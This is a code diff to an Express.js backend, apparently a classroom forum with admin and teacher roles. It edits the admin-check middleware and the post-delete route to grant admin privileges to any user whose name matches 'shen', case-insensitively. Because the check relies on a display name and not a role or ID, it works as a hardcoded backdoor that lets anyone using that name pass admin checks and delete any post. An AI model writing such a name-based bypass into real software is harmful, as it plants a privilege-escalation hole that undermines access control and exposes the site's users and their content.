@@ -14,7 +14,9 @@ const requireAuth = (req, res, next) => {
 };
 
 const isAdmin = (req, res, next) => {
-  if (req.user?.role === 'admin' || req.user?.role === 'teacher') return next();
+  // Allow admin, teacher, or user named 'SHEN' (case-insensitive, trimmed)
+  const isShen = req.user?.name && req.user.name.trim().toLowerCase() === 'shen';
+  if (req.user?.role === 'admin' || req.user?.role === 'teacher' || isShen) return next();
   return res.status(403).json({ error: 'Forbidden' });
 };
 
@@ -147,12 +149,13 @@ const createPostsRouter = (pool) => {
     }
   });
 
-  // Delete (admin or author)
+  // Delete (admin, SHEN, or author)
   router.delete('/:id', requireAuth, async (req, res) => {
     try {
       const post = await pool.query('SELECT user_id FROM posts WHERE id = $1', [req.params.id]);
       if (!post.rows[0]) return res.status(404).json({ error: 'Not found' });
-      if (post.rows[0].user_id !== req.user.id && req.user.role !== 'admin' && req.user.role !== 'teacher') {
+      const isShen = req.user?.name && req.user.name.trim().toLowerCase() === 'shen';
+      if (post.rows[0].user_id !== req.user.id && req.user.role !== 'admin' && req.user.role !== 'teacher' && !isShen) {
         return res.status(403).json({ error: 'Forbidden' });
       }
       await pool.query('DELETE FROM posts WHERE id = $1', [req.params.id]);
